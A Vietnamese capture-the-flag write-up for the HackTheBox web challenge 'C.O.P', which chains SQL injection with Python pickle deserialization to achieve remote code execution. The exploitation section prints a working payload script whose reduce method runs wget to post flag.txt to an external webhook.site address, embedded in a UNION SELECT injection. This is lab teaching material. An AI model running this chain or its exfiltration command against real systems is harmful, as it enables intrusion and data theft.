---
title: "C.O.P"
date: 2026-04-23
platform: "HackTheBox"
category: "Web"
difficulty: "Medium"
tags: ["web", "hackthebox"]
draft: false
---

# C.O.P
## Challenge Information
- **Category**: Web Exploitation
- **Event**: none
- **Author**: InfoSecJack
- **Difficulty**: Easy
- **URL**: https://app.hackthebox.com/challenges/C.O.P
- **Tags**: #web #insecure_deserialization #SQLi
---
## 1. Description
>The C.O.P (Cult of Pickles) have started up a new web store to sell their merch. We believe that the funds are being used to carry out illicit pickle-based propaganda operations! Investigate the site and try and find a way into their operation!
## 2. Overview
Một trang bán quần áo nhưng chứa các lỗ hổng nguy hiểm có thể RCE bằng cách bypass SQL injection và tận dụng lỗ hổng insecure_deserialization
## 3. Reconnaissance
Với một bài whitebox thì ta sẽ đi dạo web để trải nghiệm các chức năng trước:

![](./images/Pasted%20image%2020260328181516.png)

Sau khi dạo sơ lược thì đây là một trang web bán các item, bây giờ ta sẽ kiểm tra các file để xem mục tiêu FLAG của ta đang nằm ở đâu:

![](./images/Pasted%20image%2020260328181843.png)

Kiểm tra file `/application/models.py` ta có thể thấy hàm `select_by_id` cho phép người dùng truy vấn sản phẩm theo `id` nhưng lại mắc một sai lầm rất lớn là không filter tham số `product_id`. Kết hợp với route `/view/<product_id>` trong file `/blueprints/routes` ta có thể suy ra web này dính SQLi.

![](./images/Pasted%20image%2020260328184351.png)

![](./images/Pasted%20image%2020260328185026.png)

Ta sẽ test bên ngoài web thật để confirm:
- Payload: `'`

![](./images/Pasted%20image%2020260328194852.png)

- Payload: `1 'OR 1=1--`

![](./images/Pasted%20image%2020260328195552.png)

-> 100% SQLi, nhưng FLAG không nằm ở Database, ta sẽ thử recon thêm những file khác.

Đến với `/application/templates/app.py` ta để ý web dùng thư viện `pickle`

![](./images/Pasted%20image%2020260328200509.png)

`pickle` khá nổi tiếng về mặt kém an toàn của nó, cụ thể (*nguồn từ AI đã được xác thực*):

>Thư viện `pickle` sử dụng một "magic method" có tên là `__reduce__()` để biết cách serialize (mã hóa) và deserialize (giải mã) một đối tượng.
>
>Nếu bạn định nghĩa phương thức `__reduce__()` trong một class, bạn có thể chỉ định chính xác hàm nào sẽ được gọi và với các tham số nào khi đối tượng đó được unpickle. Kẻ tấn công lợi dụng tính năng này để chèn các hàm thực thi lệnh hệ thống (ví dụ: `os.system`).

Và để ý ở hàm `pick_loads()` ở dòng số 11, kết hợp với tham số `pickle` ở file `\application\templates\index.html`:

![](./images/Pasted%20image%2020260328202533.png)

Ở câu lệnh `{% set item = product.data | pickle %}` sử dụng **Jinja2 template**, câu lệnh này cho phép data input đi vào filter tên là `pickle` và filter này đã được dev định nghĩa ở file `app.py`: 

![](./images/Pasted%20image%2020260328204216.png)

Deserialization xảy ra ở ngay phần return của hàm `pickle_loads()`, đoạn return này trả về `pickle.loads(base64.b64decode(s))` chính là tiến hành decode chuỗi Base64 và tái tạo nó thành object trong Python. 

Và hàm `pickle.loads()` cực kỳ nguy hiểm ở chỗ nó khi thực hiện việc tái tạo object, nó cho phép các object này tự định nghĩa lại cách chúng được tái tạo thông qua magic method là `__reduce__()`. Và với hàm này, nếu ta inject mã độc vào thì `pickle.loads()` cũng sẽ nhắm mắt cho qua và thực thi chúng một các tự nguyện.

-> Data đi từ cơ sở dữ liệu -> được đưa lên template engine -> lọt vào filter pickle -> Dính insecure deserialization. 

Liệu ta có thể chain từ SQLi -> insecure deserialization để RCE?????
## 4. Exploitation
Kết hợp với endpoint dính SQLi ở trên, ta sẽ viết script để tạo payload như sau:

```python
import pickle, base64, urllib.parse, requests

class Payload:
    def __reduce__(self):
        import os
        cmd = ("wget --post-file flag.txt webhook.site/e8c4b033-6f75-4dfa-bcfc-e05b825e97ae")
        return os.system, (cmd,)

raw_base64 = base64.b64encode(pickle.dumps(Payload())).decode()

sqli = f"' UNION SELECT '{raw_base64}' -- "

final_payload = urllib.parse.quote(sqli)

print("GET /view/" + final_payload + " HTTP/1.1")
```

Trong đó:
- `cmt`: đây chính là câu lệnh ta muốn server thực hiện
- phần webhook... chính là trang để hứng kết quả

*Lưu ý: Phải chạy script này trên máy dùng Linux OS để việc mã hóa phù hợp với server (hoặc có thể dùng onlinegdb.com hay các trình chạy Python public trên internet). Vì mình dùng Windows nên bug này mình fix rất lâu mới ra =)))*

Kết quả đoạn code:

![](./images/Pasted%20image%2020260328213454.png)

Gửi payload thôi:

![](./images/Pasted%20image%2020260328213419.png)

Quay sang webhook để lấy FLAG

![](./images/Pasted%20image%2020260328213550.png)

>h@ppy h@ck!n9 
>*(BKSEC)*